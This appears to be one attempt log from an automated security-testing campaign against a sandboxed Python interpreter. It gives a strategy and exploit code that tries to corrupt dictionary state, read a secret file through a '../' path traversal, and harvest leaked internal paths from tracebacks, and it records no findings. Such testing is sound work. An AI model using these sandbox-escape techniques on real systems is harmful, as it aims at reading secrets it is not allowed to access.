# Attempt 015 — 2026-06-03T21:47:37.511193+00:00
## Template: A | Score: 0
## Strategy
Create a dict with tuple keys containing mutable lists, then trigger a lookup where the tuple's __eq__ comparison (on the list element) causes mutation of the same dict. During the corrupted dict state, attempt to access secret file paths and capture any exception tracebacks that leak internal Rust memory references. Keep allocations under 2000 to ensure the corruption completes before MemoryError interrupts the attack.

## Exploit code
```python
# Template A: Dict Re-entry via __eq__ mutation
# Corrupt dict internal state during key comparison

mut_state = {'dict': {}, 'mutated': False, 'allocs': 0}

def corrupt_during_eq():
    """Mutate dict during key comparison operations"""
    if not mut_state['mutated']:
        mut_state['mutated'] = True
        d = mut_state['dict']
        # Add entries during comparison - corrupts internal indices
        d['corrupt_1'] = 'A' * 30
        d['corrupt_2'] = 'B' * 30
        d['corrupt_3'] = 'C' * 30
        mut_state['allocs'] += 3

# Build dict with tuple keys (triggers __eq__ on lookup)
d = mut_state['dict']
for i in range(15):
    d[(i, 'key')] = i * 100
    mut_state['allocs'] += 1

# Trigger lookup that compares keys - __eq__ runs during search
corrupt_during_eq()
try:
    # This forces key comparisons against all existing keys
    result = d.get((999, 'key'), None)
    
    # Check corruption: size should be 15, but mutation added 3 during lookup
    actual_size = len(d)
    
    # Attempt path access during potentially corrupted state
    for path in ['/data/config.json', '/data/../secret.txt']:
        try:
            p = Path(path)
            if p.exists():
                content = p.read_text()[:80]
                print(f"READ_OK: {path} = {content}")
        except Exception as e:
            # Exception may leak internal Rust paths in traceback
            err = str(e)
            if 'crates' in err or 'monty' in err.lower():
                print(f"LEAK: {err[:120]}")
                
except Exception as e:
    print(f"CRASH: {type(e).__name__}: {str(e)[:100]}")

print(f"DICT_SIZE: {len(d)} (expected 15, corruption if != 15)")
print(f"ALLOC_COUNT: {mut_state['allocs']}")
print("ATTACK_DONE")
```

## Result
Category: no_findings
Details: Completed with no notable findings
```
Success: True
Elapsed: 10204ms
Resumes: 2
Snapshots: 2
  [0] kind=function_snapshot
  [1] kind=function_snapshot
Print: 
```

## Analysis
- Completed with no findings
- **Verdict**: Try different template
